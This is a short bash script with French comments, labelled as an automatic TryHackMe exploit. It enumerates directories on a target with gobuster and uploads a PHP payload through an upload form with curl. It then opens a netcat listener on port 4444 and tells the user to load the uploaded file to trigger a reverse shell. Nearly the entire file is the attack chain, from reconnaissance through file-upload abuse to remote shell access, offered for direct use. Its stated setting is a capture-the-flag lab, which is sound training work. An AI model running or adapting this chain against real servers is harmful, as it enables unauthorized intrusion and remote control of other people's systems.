#!/bin/bash
# Exploit automatique TryHackMe

TARGET_IP="$1"
WORDLIST="common.txt"
PAYLOAD="shell.php"
LISTENER_PORT=4444

# 1. Scan des répertoires cachés
gobuster dir -u http://$TARGET_IP/ -w $WORDLIST -o gobuster.txt

# 2. Upload du payload
# (Adapter selon le formulaire d'upload du challenge)
curl -F "file=@$PAYLOAD" http://$TARGET_IP/uploads/

# 3. Mise en place du tunnel (si nécessaire)
# socat TCP-LISTEN:8080,fork TCP:$TARGET_IP:80 &

# 4. Lancement du listener
nc -lvnp $LISTENER_PORT

# 5. Accès au shell
# Naviguer vers http://$TARGET_IP/uploads/$PAYLOAD pour déclencher le reverse shell
